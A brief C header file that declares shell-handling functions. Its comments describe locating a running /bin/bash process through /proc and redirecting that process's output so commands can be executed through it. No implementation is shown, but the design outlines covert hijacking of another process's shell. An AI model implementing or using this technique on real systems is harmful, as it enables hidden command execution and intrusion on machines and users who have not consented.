#ifndef SHELL_H_
#define SHELL_H_

char* find_shell(void); // find a shell we can use to run command, return the shell's path
int run_cmd(char* shell_path, char* cmd, char* output); // run a command through the shell we found and return the output
int create_shell_process(char* shell_path); // create a shell process and return the socketfd
int communicate_shell(int pid, char* cmd, char* output); // send a command to a shell process

// loop through /proc to find a /proc/<pid>/exe that links to /bin/bash.
// if we find a pid for a /bin/bash shell, we use it to execute our command
// temporarily redirect the bash process's stdout to our process and read from it.
int find_bash_pid(void); // find /bin/bash pid
int send_to_bash(char* cmd);

#endif
